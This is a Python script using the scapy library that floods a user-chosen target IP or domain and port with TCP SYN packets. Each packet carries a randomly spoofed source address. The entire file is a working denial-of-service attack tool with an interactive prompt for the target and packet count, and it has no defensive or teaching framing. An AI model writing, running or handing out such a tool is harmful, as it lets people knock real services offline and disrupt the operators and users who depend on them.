from scapy.all import *
import os
import sys
import random

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

def SYN_Flood(Dst,dstPort,counter):
	total = 0
	print ("Packets are sending ...")
	for i in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()
		IP_Packet = scapy.all.IP()
		IP_Packet.src = randomIP()
		IP_Packet.dst = Dst

        
		TCP_Packet = scapy.all.TCP()	
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow
		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1
	print("\nTotal packets sent: %i\n" % total)


def info(): 
    print("Enter 1 if you want to Enter the IP address of the target")
    print("Enter 2 If you want to enter the Domain name of the target \n")
    choice = int(input("Enter your Choice: "))
    if choice == 1:
        Dst = input("\nTarget IP : ")
        dstPort = input("Target Port : ") 
    elif choice == 2:
        Dst = input("\nTarget Domain Name : ") 
        dstPort = input("Target Port : ") 
    return Dst,int(dstPort)
try:
    Dst,dstPort = info()
    counter = input ("How many packets do you want to send : ")
    SYN_Flood(Dst,dstPort,int(counter))

except:
    print("An Error occured")